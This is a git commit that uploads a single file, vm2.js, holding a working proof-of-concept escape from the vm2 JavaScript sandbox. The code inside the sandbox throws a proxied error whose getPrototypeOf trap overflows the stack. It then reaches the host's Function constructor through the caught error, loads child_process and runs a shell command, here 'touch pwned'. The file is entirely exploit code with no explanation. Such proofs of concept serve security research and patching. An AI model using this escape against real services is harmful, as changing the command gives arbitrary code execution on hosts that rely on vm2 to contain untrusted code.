0bc6fa0d3d647974768d080adf68117d065acfd3
Nay Lin Aung <118907074+hapispidey@users.noreply.github.com>
2024-01-30 09:56:40 +0630

    Add files via upload

---
+++ vm2.js
@@ -0,0 +1,23 @@
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+}
+`
+
+console.log(vm.run(code));
